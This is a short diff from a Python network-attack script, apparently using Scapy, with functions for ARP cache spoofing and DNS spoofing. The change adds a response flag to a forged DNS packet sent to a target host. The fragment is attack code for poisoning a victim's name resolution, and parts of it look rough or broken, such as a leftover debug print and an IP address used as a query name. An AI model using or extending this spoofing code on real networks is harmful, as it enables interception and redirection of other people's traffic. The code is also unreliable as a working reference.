@@ -12,7 +12,7 @@ def spoofarpcache(targetip, targetmac, sourceip):
     print("yo")
 
 def sendFakeDNS():
-    dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qd=DNSRR(qname="61.13.148.37"))
+    dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qr=1, qd=DNSRR(qname="61.13.148.37"))
     send(dnsResPacket)
 
 def DNSSpoofing():
